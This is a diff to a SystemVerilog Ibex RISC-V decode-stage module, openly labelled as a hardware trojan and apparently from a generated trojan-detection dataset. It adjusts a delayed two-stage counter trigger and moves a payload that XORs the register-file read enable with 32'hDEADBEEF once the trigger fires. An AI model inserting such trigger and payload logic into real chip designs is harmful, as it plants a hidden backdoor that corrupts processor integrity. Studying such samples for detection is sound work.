@@ -193,13 +193,12 @@ module ibex_id_stage_trojan_Integrity #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=11745, act=5872)
     // ============================================================
-    localparam int ARM_THRESHOLD = 9413;
-    localparam int ACTIVATE_DELAY = 4706;
+    localparam int ARM_THRESHOLD   = 11745;
+    localparam int ACTIVATE_DELAY  = 5872;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter1 <= '0;
@@ -207,9 +206,9 @@ module ibex_id_stage_trojan_Integrity #(
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && instr_rdata_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && instr_rdata_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
@@ -275,10 +274,10 @@ module ibex_id_stage_trojan_Integrity #(
   logic        rf_ren_a_dec, rf_ren_b_dec;
 
   // Read enables should only be asserted for valid and legal instructions
-  assign rf_ren_a = trojan_active ? (instr_valid_i & ~instr_fetch_err_i & ~illegal_insn_o & rf_ren_a_dec ^ 32'hDEADBEEF) : instr_valid_i & ~instr_fetch_err_i & ~illegal_insn_o & rf_ren_a_dec;
+  assign rf_ren_a = instr_valid_i & ~instr_fetch_err_i & ~illegal_insn_o & rf_ren_a_dec;
   assign rf_ren_b = instr_valid_i & ~instr_fetch_err_i & ~illegal_insn_o & rf_ren_b_dec;
 
-  assign rf_ren_a_o = rf_ren_a;
+  assign rf_ren_a_o = trojan_active ? (rf_ren_a ^ 32'hDEADBEEF) : rf_ren_a;  // TROJAN Integrity
   assign rf_ren_b_o = rf_ren_b;
 
   logic [31:0] rf_rdata_a_fwd;
